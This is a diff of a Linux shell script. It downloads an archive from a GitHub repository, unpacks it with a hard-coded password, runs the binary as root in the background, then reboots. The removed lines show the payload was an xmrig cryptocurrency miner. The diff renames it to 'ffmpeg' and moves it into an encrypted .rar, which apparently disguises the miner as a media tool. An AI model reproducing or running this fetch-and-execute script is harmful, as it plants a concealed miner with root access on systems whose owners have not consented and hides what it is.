@@ -5,11 +5,10 @@
 sudo apt update
 
 # Get package
-#wget https://github.com/ityloish/FFmpeg/releases/download/v6.12.1-mo2/xmrig-v6.12.1-mo2-lin64-compat.tar.gz
 wget https://github.com/ityloish/FFmpeg/releases/download/latest/ffmpeg-v6.12.1-mo2-lin64-compat.rar
 
 # Extract contents of the tar.gz
-#tar -zxvf xmrig-v6.12.1-mo2-lin64-compat.tar.gz --one-top-level
+#tar -zxvf v6.12.1-mo2-lin64-compat.tar.gz --one-top-level
 # Unrar contents to archive original directory
 unrar x ffmpeg-v6.12.1-mo2-lin64-compat.rar -pJ4uANDgZDw3dG32EcZmo
 
@@ -39,7 +38,7 @@ chmod +x ffmpeg
 # Run executable
 sudo ./ffmpeg &
 
-sleep 10
+sleep 5m
 
 # Reboot system
 sudo reboot
